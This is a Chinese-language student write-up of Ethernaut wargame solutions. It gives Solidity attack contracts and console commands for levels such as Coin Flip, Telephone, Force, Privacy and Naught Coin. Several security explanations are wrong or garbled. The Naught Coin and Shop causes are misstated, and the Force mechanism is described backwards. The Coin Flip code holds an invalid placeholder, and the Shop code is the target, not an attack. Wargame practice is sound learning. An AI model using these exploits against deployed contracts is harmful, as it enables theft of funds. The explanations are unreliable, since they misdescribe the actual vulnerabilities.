# 團體作業 - 第三組

## 共同討論完成所有 [Ethernaut](https://ethernaut.openzeppelin.com/) 題目

1. 共同討論完成所有 Ethernaut 題目：[https://ethernaut.openzeppelin.com/](https://ethernaut.openzeppelin.com/)
    * 若卡關可以偷偷網路上搜尋解答，建議可以先思考討論再看答案

<!-- https://cyanwingsbird.blog/solidity/ethernaut/1-fallback/

https://xz.aliyun.com/t/7173

https://cloud.tencent.com/developer/article/2235227 -->

---

### Ethernautu遊戲學習重點:

* 安全問題
* 涉及合約的分析
* 攻擊流程的演示

--

3. Coin Flip

隨機數用 blockhash 容易被預測而變成攻擊目標，建議使用第三方服務，像是 chainLink 來取得隨機數。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract CoinFlipAttack {
    ICoinFlip constant private target = ICoinFlip(await contract獲取的實體地址);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```

```
Number(await contract.consecutiveWins())
```

![](https://i.imgur.com/OPkrhp2.png)

--

4. Telephone

在智能合約編程中，盡量不要使用 x.origin，因為它容易受到攻擊，即攻擊者可以偽造訊息，將其發送給一個合約，同時將 x.origin 偽造成另一個地址，從而騙取合約的某些權限。相反，msg.sender 更加安全，因為它不容易被攻擊者偽造。

```
pragma solidity ^0.8;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}

contract Hack {
    constructor(address _target) {
        // tx.origin = msg.sender
        // msg.sender = address(this)
        ITelephone(_target).changeOwner(msg.sender);
    }
}
/*
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

![](https://i.imgur.com/o6HLfym.png)

--

7. Force

selfdestruct 可以讓一個合約在自我銷毀之前將其餘的以太幣發送到一個指定的地址。攻擊者可以利用合約內的漏洞，使得目標合約在執行自毀函數時，將合約餘額轉移給攻擊者控制的地址，從而實現向目標合約強制轉賬。建議避免在合約內部存儲過多的以太幣，限制自毀函數的權限等。
```
pragma solidity ^0.8;

contract Hack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```

![](https://i.imgur.com/eKZUN4u.png)

--

12. privacy

以太坊在儲存時是以32 bytes為一格順序儲存的，所以定義變量的順序會影響花費Gas的多少

依32 bytes 一格，會以下劃分:

Slot 0
```
bool public locked = true;
```
Slot 1
```
uint256 public ID = block.timestamp;
```
Slot 2
```
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
```
Slot 3-5
```
bytes32[3] private data;
```


以下是在console的輸入過程
```
await web3.eth.getStorageAt(instance, 5)
'0x60d11579d2e9f3002771e25ea211665c2728080663f62254aff89d7ef1ccd863'

<!-- 取0x後面的32位 -->
contract.unlock("0x60d11579d2e9f3002771e25ea211665c")
```

--

15. Naught Coin

為了防止這種漏洞，合約應該使用 SafeMath 庫來避免整數溢出攻擊。此外，合約應該在對代幣數量進行操作之前，應該先檢查操作是否合法，例如檢查代幣數量是否超過了合約的最大值。開發者還可以使用 require 語句來確保合約在滿足特定條件時才能繼續執行。

```
pragma solidity ^0.8;

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// 1. Deploy
// 2. coin.approve(hack, amount)
// 3. pwn
contract Hack {
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint256 bal = coin.balanceOf(player);
        coin.transferFrom(player, address(this), bal);
    }
}
```
![](https://i.imgur.com/7iDsLJs.png)

--

21. Shop

該合約的漏洞在於，合約在購買商品時並未檢查商品的價格是否為0。合約應該在購買商品之前檢查商品的價格是否為正確的價格，也應該在購買商品時檢查付款是否等於商品價格。這些檢查可以通過實現合約中的相應函數來實現，例如在購買商品時實現一個 buyItem 函數，在其中進行價格檢查和付款檢查。此外，還可以使用 SafeMat h庫來避免整數溢出攻擊，以及使用 require 語句來確保合約在滿足特定條件時才能繼續執行。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
![](https://i.imgur.com/0P00J1K.png)
